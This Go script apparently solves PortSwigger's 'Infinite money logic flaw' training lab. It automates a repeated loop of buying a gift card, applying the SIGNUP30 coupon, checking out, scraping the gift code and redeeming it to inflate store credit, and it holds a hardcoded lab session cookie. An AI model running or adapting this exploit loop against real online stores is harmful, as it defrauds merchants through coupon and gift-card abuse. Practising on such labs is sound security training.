//Creator Oier Zalba 
//Date 14/12/2022
//Burpsuite intruder alternative
//Scritp example for "Infinite money logic flaw" portswigger lab
//Edit the loop as you wish

package main

import (
  "fmt"
  "net/http"
  "net/http/cookiejar"
  "log"
  "io/ioutil"
  "bytes"
  "os"
  "strings"
  "strconv"
)

//Insert your url and cookie after loging in
var url = "https://0ae6008b04dbaaa1c403ed2400270059.web-security-academy.net/"
var session = "bzsXlnyWdobwJZAv6xxC1f44omIZt32Y"


func save_page_to_html( s string) (int) { 
   
   //Init cookiejar
   jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalf("Error while creating cookie jar %s", err.Error())
	}
   
   //Init client without redirection (302), and with cookies
   client := &http.Client{
      CheckRedirect: func(req *http.Request, via []*http.Request) error {
         return http.ErrUseLastResponse
      },
      Jar: jar,
   }
 
   
   
   
   
   //POST1 add coupon to the cart
   str := "productId=2&redir=PRODUCT&quantity=1"
   jsonBody := []byte(str)
   bodyReader := bytes.NewReader(jsonBody)
   urlaux := url+"cart"
   fmt.Println("POST1 " + urlaux)
   req, err := http.NewRequest(http.MethodPost, urlaux, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets the cookie after the log in
   cookie := &http.Cookie{
	    Name:   "session",
	    Value:  session,
	    MaxAge: 300,
    }
   req.AddCookie(cookie)
   
   resp, err := client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   body, err := ioutil.ReadAll(resp.Body)
   if err != nil {
      log.Fatalln(err)
   }
   
   sb := string(body)
   //fmt.Println(sb)
   
   
   
   
   
   
   
   
   //GET2 to obtain csrf from the cart to submit after
   fmt.Println("GET2 " + urlaux)
   req, err = http.NewRequest(http.MethodGet, urlaux,nil)
   if err != nil {
       log.Fatalf("Got error %s", err.Error())
   }
   
   req.AddCookie(cookie)

   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
    
   
   
   body, err = ioutil.ReadAll(resp.Body)
   if err != nil {
      log.Fatalln(err)
   }
   
   sb = string(body)
   
   parts := strings.Split(sb,"\n")
   index := 0
   for i := 0; i < len(parts); i++{
      if strings.Index(parts[i],"csrf") >= 0{         
         index = i
         break
      }
   }  
   parts2 := strings.Split(parts[index],"\"")
   csrf := parts2[5]
   //fmt.Println(csrf)

   
   
   
   
   
   
   
   
   //POST3 apply coupon to the cart with csrf
   str = "csrf="+csrf+"&coupon=SIGNUP30"
   jsonBody = []byte(str)
   bodyReader = bytes.NewReader(jsonBody)
    
   urlaux = url+"cart/coupon"
   fmt.Println("POST3 " + urlaux)
   req, err = http.NewRequest(http.MethodPost, urlaux, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets second cookie
   req.AddCookie(cookie)
   
   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   
   
   
   
   
   //POST4 checkout cart
   str = "csrf="+csrf
   jsonBody = []byte(str)
   bodyReader = bytes.NewReader(jsonBody)
    
   urlaux = url+"cart/checkout"
   fmt.Println("POST4 " + urlaux)
   req, err = http.NewRequest(http.MethodPost, urlaux, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets second cookie
   req.AddCookie(cookie)
   
   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   
   
   
   
   
   
   
   
   
   //GET5 order confirmation and gitfcode
   urlaux = url+"cart/order-confirmation?order-confirmed=true"
   fmt.Println("GET5 " + urlaux)
   req, err = http.NewRequest(http.MethodGet, urlaux,nil)
   if err != nil {
       log.Fatalf("Got error %s", err.Error())
   }
   
   req.AddCookie(cookie)

   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
    
   
   
   body, err = ioutil.ReadAll(resp.Body)
   if err != nil {
      log.Fatalln(err)
   }
   
   sb = string(body)
   
   parts = strings.Split(sb,"\n")
   index = 0
   for i := 0; i < len(parts); i++{
      if strings.Index(parts[i],"You have bought the following gift cards:") >= 0{         
         index = i
         break
      }
   }  
   index = index + 7
   parts2 = strings.Split(parts[index],">")
   parts3 := strings.Split(parts2[1],"<")
   giftcode := parts3[0]
   //fmt.Println(giftcode)
   
   
   
   
   
   //POST6 using gift-card
   str = "csrf="+csrf+"&gift-card="+giftcode
   jsonBody = []byte(str)
   bodyReader = bytes.NewReader(jsonBody)
    
   urlaux = url+"gift-card"
   fmt.Println("POST6 " + urlaux)
   req, err = http.NewRequest(http.MethodPost, urlaux, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets second cookie
   req.AddCookie(cookie)
   
   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   
   
   
   
   
   
   
   
   
   //GET7 get the credit
   urlaux = url+"cart"
   fmt.Println("GET7 " + urlaux)
   req, err = http.NewRequest(http.MethodGet, urlaux,nil)
   if err != nil {
       log.Fatalf("Got error %s", err.Error())
   }
   
   req.AddCookie(cookie)

   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
    
   
   
   body, err = ioutil.ReadAll(resp.Body)
   if err != nil {
      log.Fatalln(err)
   }
   
   //gets second csrf
   sb = string(body)
   //fmt.Println(sb)
   
   
   parts = strings.Split(sb,"\n")
   index = 0
   storecredit := 0 
   for i := 0; i < len(parts); i++{
      if strings.Index(parts[i],"Store credit") >= 0{         
         storecredit = i
      }
   }  

   parts2 = strings.Split(parts[storecredit],"$")
   parts3 = strings.Split(parts2[1],"<")
   credit := parts3[0]
   
   
   fmt.Println("The card credit is: " + credit)
   
   
   
   //Exit condition
   credit2, err := strconv.ParseFloat(credit, 32)
   if credit2 > 1337.0 {
      fmt.Println("You have enough credit to buy the jacket")
      os.Exit(1)
   }


   return resp.StatusCode
}

func main() {
    
    
    //Loop
    for i := 0; i < 500; i++ {
     s := fmt.Sprintf("%04d", i)
          
     save_page_to_html(s)

        
    }
    
    fmt.Println("Finished")

}
